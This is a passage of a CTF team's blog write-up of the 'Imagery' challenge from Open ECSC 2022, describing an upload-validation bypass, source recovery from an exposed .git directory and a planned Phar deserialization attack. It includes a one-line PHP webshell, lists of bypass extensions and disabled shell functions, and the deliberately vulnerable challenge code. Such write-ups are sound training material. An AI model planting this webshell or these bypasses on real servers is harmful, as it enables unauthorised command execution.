@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <!-- title will be injected from _config.yml -->
+  <!-- Stylesheets -->
+  
+  <link rel="stylesheet" href="/assets/css/bootstrap.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/responsive.css">
+  <link rel="stylesheet" href="/assets/css/import_custom.css">
+
+  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+
+  <!-- Responsive -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Imagery | LetzPwn - Luxembourgish CTF Team</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Imagery" />
+<meta name="author" content="Voyyce (Jaak Weyrich)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description You have been requested to perform a security check on an image validation service on a target server. Please start the service from RESOURCES and find any vulnerabilities, grab a flag from a file in server outside Webroot as proof." />
+<meta property="og:description" content="Description You have been requested to perform a security check on an image validation service on a target server. Please start the service from RESOURCES and find any vulnerabilities, grab a flag from a file in server outside Webroot as proof." />
+<link rel="canonical" href="/writeup/2022/08/04/imagery.html" />
+<meta property="og:url" content="/writeup/2022/08/04/imagery.html" />
+<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
+<meta property="og:image" content="/img/imagery0_thumbnail.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-04T23:10:05+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/img/imagery0_thumbnail.png" />
+<meta property="twitter:title" content="Imagery" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Voyyce (Jaak Weyrich)"},"dateModified":"2022-08-04T23:10:05+00:00","datePublished":"2022-08-04T23:10:05+00:00","description":"Description You have been requested to perform a security check on an image validation service on a target server. Please start the service from RESOURCES and find any vulnerabilities, grab a flag from a file in server outside Webroot as proof.","headline":"Imagery","image":"/img/imagery0_thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2022/08/04/imagery.html"},"url":"/writeup/2022/08/04/imagery.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
+  <div class="page-wrapper"><!-- Main Header -->
+<header class="main-header">
+  <!-- Header Top -->
+  <div class="header-top">
+    <div class="auto-container clearfix">
+
+      <div class="top-left clearfix">
+        <ul class="info-list">
+          <li>The first Luxembourgish CTF Team</li>
+        </ul>
+      </div>
+
+      <div class="top-right">
+        <ul class="social-icons">
+          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Upper -->
+  <div class="header-upper">
+    <div class="inner-container">
+      <div class="auto-container clearfix">
+        <!--Logo-->
+        <div class="logo-outer">
+          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
+                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
+        </div>
+
+        <!--Nav Box-->
+        <div class="nav-outer clearfix">
+          <!--Mobile Navigation Toggler-->
+          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>
+
+          <!-- Main Menu -->
+          <nav class="main-menu navbar-expand-md navbar-light">
+            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
+              <ul class="navigation clearfix pull-left">
+                
+                
+                <li class=""><a href="/">Home</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/about_us.html">About Us</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/events.html">News & CTFs</a>
+                </li>
+                
+                
+              </ul>
+
+                <ul class="navigation clearfix pull-right">
+                  
+                    
+                    <li class=""><a href="/sponsors.html">Sponsors</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/writeups.html">Writeups</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/contact.html">Contact</a> </li>
+                    
+                  
+                </ul>
+            </div>
+          </nav>
+          <!-- Main Menu End-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--End Header Upper-->
+
+  <!-- Sticky Header  -->
+  <div class="sticky-header">
+    <div class="auto-container clearfix">
+      <!--Logo-->
+      <div class="logo pull-left">
+        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
+      </div>
+      <!--Right Col-->
+      <div class="pull-right">
+        <!-- Main Menu -->
+        <nav class="main-menu clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </nav><!-- Main Menu End-->
+      </div>
+    </div>
+  </div><!-- End Sticky Menu -->
+
+  <!-- Mobile Menu  -->
+  <div class="mobile-menu">
+    <div class="menu-backdrop"></div>
+    <div class="close-btn"><span class="icon flaticon-close"></span></div>
+
+    <nav class="menu-box">
+      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
+      <div class="menu-outer">
+        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      </div>
+      <!--Social Links--
+      <div class="social-links">
+        <ul class="clearfix">
+          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
+        </ul>
+      </div>-->
+    </nav>
+  </div><!-- End Mobile Menu -->
+</header>
+<!--Page Title-->
+<div itemscope itemtype="http://schema.org/BlogPosting">
+  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
+    <div class="auto-container">
+      <div class="inner-container clearfix">
+        <ul class="bread-crumb clearfix">
+          <li><a href="/index.html">Home</a></li> 
+          <li><a href="/writeups.html">Writeups</a></li>
+          <li><a href="#">Open ECSC 2022 - Round 3</a></li> <!-- TODO: correct href-->
+          <li itemprop="name headline">Imagery Writeup</li>
+        </ul>
+        <h1>Imagery Writeup</h1><ul class="custom-author">
+                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
+                      class="p-author h-card" itemprop="name">Voyyce (Jaak Weyrich)</span></span>
+                </li>
+              </ul>
+              <br/><div class="custom-date">Aug 4, 2022</div>
+        <ul class="tags">
+          <li>Solves: N/A teams</li>
+          <li>Source: <a href="https://ecsc.hacking-lab.com/" target="_blank" rel="noopener noreferrer">https://ecsc.hacking-lab.com/</a></li>
+        </ul>
+    </div>
+  </section>
+  <!--End Page Title-->
+
+  <!--Sidebar Page Container-->
+  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
+    <div class="auto-container">
+      <div class="row clearfix">
+
+        <!--Content Side / Blog Detail-->
+        <div class="content-side col-lg-8 col-md-12 col-sm-12">
+          <div class="blog-detail">
+            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
+              <p> <h2 id="description">Description</h2>
+<blockquote>
+  <p>You have been requested to perform a security check on an image validation service on a target server. Please start the service from RESOURCES and find any vulnerabilities, grab a flag from a file in server outside Webroot as proof.</p>
+</blockquote>
+
+<p><img src="img/imagery0_thumbnail.png" alt="Image of Challenge" /></p>
+
+<h2 id="tldr">TL;DR</h2>
+<ul>
+  <li>PHP Deserialization vulnerability using a Phar file allowing bypass of upload validation of image files enabling execution of webshell (along with using some additional bypasses, retrieving source code from exposed .git repo, …)</li>
+</ul>
+
+<h2 id="complete-writeup">Complete Writeup</h2>
+<p>We are greeted with a pretty basic site containing nothing but an upload functionality on <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+
+<p><img src="img/imagery1_indexhtml.png" alt="" /></p>
+
+<p>When uploading an image file (I tried png, jpg and jpeg), we get redirected to <code class="language-plaintext highlighter-rouge">index.php?success=1</code> showing a success message indicating <code class="language-plaintext highlighter-rouge">Success, file is validated and cached</code>. Especially the word <code class="language-plaintext highlighter-rouge">cached</code> is interesting here. Seems like the file is saved somewhere.</p>
+
+<p><img src="img/imagery2_uploadSuccessMessage.png" alt="" /></p>
+
+<p>When uploading a .pdf file for example, the service returns an error message, saying <code class="language-plaintext highlighter-rouge">Sorry, there was an error while uploading your file!</code>.</p>
+
+<p>Bruteforcing directories reveals an <code class="language-plaintext highlighter-rouge">/uploads</code> directory. This seems interesting. When requesting <code class="language-plaintext highlighter-rouge">/uploads</code>, after being redirected a couple of times, we get a 200 OK with an empty html:</p>
+
+<p><img src="img/imagery3_uploadphpRedirects.png" alt="" /></p>
+
+<p>Since I don’t find anything else of interest, I took a closer look at the requests / responses and notice that each time after uploading an image, the server responds with a <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header.</p>
+
+<p>For example, when uploading a choomah.png image, it would respond with <code class="language-plaintext highlighter-rouge">Set-Cookie: PHPSESSID=eE5venlUa3lDZy5wbmc%3D</code>. The value of the cookie looks much like base64. Decoding the value gives <code class="language-plaintext highlighter-rouge">xNozyTkyCg.png</code>.
+And indeed, when navigating to <code class="language-plaintext highlighter-rouge">/uploads/xNozyTkyCg.png</code>, we see the uploaded .png file:</p>
+
+<p><img src="img/imagery4_choomah.png" alt="" /></p>
+
+<p>So now we know how to navigate to our file. My guess is that we have to upload a webshell or something of the sort that bypasses the image validation they are performing.</p>
+
+<p>Trying around a little, it seems as if the validation is relying purely on the filename provided by us in the request.
+The server seems to check if the filename ends with a whitelisted extension and generates a seemingly random name that is 10 characters long (regardless of the name provided). The extension of the file will be detected using the filename provided (given it is one of the whitelisted extensions), but won’t be 1:1 the one provided (e.g. .PnG will be .png afterwards, so probably just put to lowercase).</p>
+
+<p>So basically, we are able to upload files with any content we like and we know where to access the uploaded file (from the Set-Cookie header), but I have not figured out how to get a php webshell to execute yet, since uploading it with an extension like .png or .jpg will not have the server to execute it.</p>
+
+<p>This is the webshell I am uploading:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php echo system($_GET['command']); ?&gt;
+</code></pre></div></div>
+
+<p>I have tried several ways of obfuscating the .php extension, trying to find a vulnerability in the way that the validation works vs the way the server saves the file (i.e. it passes the file extension check but gets saved with a .php extension anyway) but I have not had luck yet.
+These are the resources I used:</p>
+<ul>
+  <li>https://infosecwriteups.com/bypass-server-upload-restrictions-69054c5e1be4</li>
+  <li>https://portswigger.net/web-security/file-upload</li>
+</ul>
+
+<p>Maybe bruteforcing all sorts of extensions here will be helpful, maybe something is 
+whitelisted that shouldnt be (phtml, php5, …). So far I have tried php php2, php3, php4, php5, php6, php7, phtml, phps, pht, phtm, pgif and shtml - without luck. The only extensions that seem to work are .jpg, .jpeg, .png, .tiff and .gif.</p>
+
+<p>We found that the <code class="language-plaintext highlighter-rouge">php.ini</code> file can simply be downloaded by requesting it under <code class="language-plaintext highlighter-rouge">/php.ini</code>. Especially line 312 seems interesting:</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">disable_functions</span> <span class="p">=</span> <span class="s">eval,exec,system,shell_exec,passthru,proc_open,proc_close,proc_get_status,proc_nice,proc_terminate,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,phpinfo,phpversion,ini_set,ini_get,get_loaded_extensions,version_compare,zend_version,php_uname,php_sapi_name,get_cfg_var,ini_get_all,ini_restore,get_extension_funcs,extension_loaded,dl</span>
+</code></pre></div></div>
+
+<p>This basically disables use of several functions that are interesting for a webshell or other sorts of exploits. Probably need to find a workaround for this once we are able to execute our uploaded .php code.</p>
+
+<p>After being stuck for a while, I took a look back at what I have done so far and noticed that my initial bruteforcing (which found the /uploads directory) might not have been as thorough as it should have been (Note to myself to not follow down some rabbit holes of possible exploits that come to mind and instead do everything thoroughly step-by-step especially in the beginning to avoid that mistake in the future).
+Anyway, I tried a wordlist to also look for common files etc. and I found a .git repository exposed under <code class="language-plaintext highlighter-rouge">.git</code>:</p>
+
+<p><img src="img/imagery5_gitrepo.png" alt="" /></p>
+
+<p>The objects folder contains several objects that turned out to be source code. I did a challenge that involved getting the source code from an exposed <code class="language-plaintext highlighter-rouge">.git</code> repo a few years back. This link describes pretty well how it works: https://levelup.gitconnected.com/learning-the-internals-of-git-by-hacking-websites-c70c59303b12</p>
+
+<p>After retrieving all of the source code, we find (amongst a Readme and the index.html) the following interesting files:</p>
+
+<ol>
+  <li>
+    <p>An upload.php file</p>
+  </li>
+  <li>
+    <p>An imageclass.php file</p>
+  </li>
+  <li>
+    <p>A logger.php file</p>
+  </li>
+</ol>
+
+<p>Let’s first take a look at <code class="language-plaintext highlighter-rouge">upload.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">include</span> <span class="s2">"imageclass.php"</span><span class="p">;</span>
+
+<span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Image</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">validate</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$image</span><span class="o">-&gt;</span><span class="n">validated</span> <span class="o">&amp;&amp;</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.php?success=1"</span><span class="p">);</span>
+        <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$image</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>
+	<span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"check"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.php?success=1"</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.php?msg=1"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>We already know the POST requets functionality implemented, which calls the <code class="language-plaintext highlighter-rouge">validate</code> and <code class="language-plaintext highlighter-rouge">save</code> function of <code class="language-plaintext highlighter-rouge">imageclass.php</code> and then upon success sets the cookie and location header.</li>
+  <li>What we didn’t know from <code class="language-plaintext highlighter-rouge">upload.php</code> is that it implements a GET endpoint as well, which passes a user-supplied string into a php <code class="language-plaintext highlighter-rouge">file_exists</code> function. We don’t know this yet but this will be important later on.</li>
+</ul>
+
+<p>Next we’ll take a look at <code class="language-plaintext highlighter-rouge">imageclass.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">include</span> <span class="s2">"logger.php"</span><span class="p">;</span>
+
+<span class="kd">class</span> <span class="nc">Image</span> <span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$tmp_name</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$target</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$logger</span><span class="p">;</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="n">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="p">;</span>
+        <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
+        <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$randomString</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\/$/"</span><span class="p">,</span> <span class="nv">$target_dir</span><span class="p">))</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target_dir</span> <span class="o">=</span> <span class="nv">$target_dir</span><span class="p">;</span>
+        <span class="k">else</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target_dir</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="mf">.</span> <span class="s2">"/"</span><span class="p">;</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">validated</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Logger</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">))</span>
+            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">validate</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s2">"name"</span><span class="p">];</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp_name</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">];</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(jpe?g|gif|png|tiff?)$/i'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" rejected"</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+	<span class="k">do</span> <span class="p">{</span>
+	    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">generateRandomString</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">;</span>
+	    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target_dir</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target</span><span class="p">));</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">validated</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">validated</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="mf">.</span> <span class="s2">" not validated!"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$rc</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp_name</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$rc</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="mf">.</span> <span class="s2">" saved to "</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">target</span><span class="p">);</span>
+        <span class="k">else</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s2">"Unable to save "</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nv">$rc</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>There is the function that generates a random 10-character long string. Does not seem to be a vulnerability in here.</li>
+  <li><code class="language-plaintext highlighter-rouge">__construct</code> and <code class="language-plaintext highlighter-rouge">__destruct</code> functions</li>
+  <li>We see how the <code class="language-plaintext highlighter-rouge">validate</code> function works: It gets the extension from <code class="language-plaintext highlighter-rouge">PATHINFO_EXTENSION</code> and applies a regular expression. If the extension does not match, the file gets rejected, else it becomes <code class="language-plaintext highlighter-rouge">validated</code>.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">save</code> function checks if the file has been validated. If so, the file is moved from its temporary location (The image has a <code class="language-plaintext highlighter-rouge">tmp_name</code>, which is a name generated by php. If I am not mistaken the file is stored under <code class="language-plaintext highlighter-rouge">/tmp/</code> directory with a 6 random character long name preceded by <code class="language-plaintext highlighter-rouge">php</code> (e.g. /tmp/phpABCDEF).) to it’s destination under the randomly generated 10-character long string followed by the extension. Does not seem to be vulnerable either.</li>
+</ul>
+
+<p>Last, let’s take a look at the logger.php. Of course from the name itself, this class seems rather uninteresting (or not since log4j CVEs), but the fact that so much logging is going on in a CTF challenge made me curious:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">Logger</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$fh</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ext</span> <span class="o">=</span> <span class="s2">"log"</span><span class="p">;</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="s2">"imagery"</span><span class="p">;</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">dir</span> <span class="o">=</span> <span class="s2">"/tmp"</span><span class="p">;</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">rext</span> <span class="o">=</span> <span class="s2">"bak"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
+
+      <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Empty message"</span><span class="p">);</span>
+
+      <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="mf">.</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ext</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span>
+          <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Failed to open logfile"</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="nb">fprintf</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span><span class="p">,</span> <span class="s2">"%s %s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="no">DATE_RFC822</span><span class="p">),</span> <span class="nv">$msg</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">rotate</span><span class="p">()</span> <span class="p">{</span>
+
+      <span class="nv">$cur</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="mf">.</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ext</span><span class="p">;</span>
+      <span class="nv">$bak</span> <span class="o">=</span> <span class="nv">$cur</span> <span class="mf">.</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">rext</span><span class="p">;</span>
+
+      <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span> <span class="o">!=</span> <span class="kc">false</span><span class="p">)</span>
+        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">fh</span><span class="p">);</span>
+
+      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$cur</span><span class="p">))</span>
+        <span class="n">returm</span><span class="p">;</span>
+
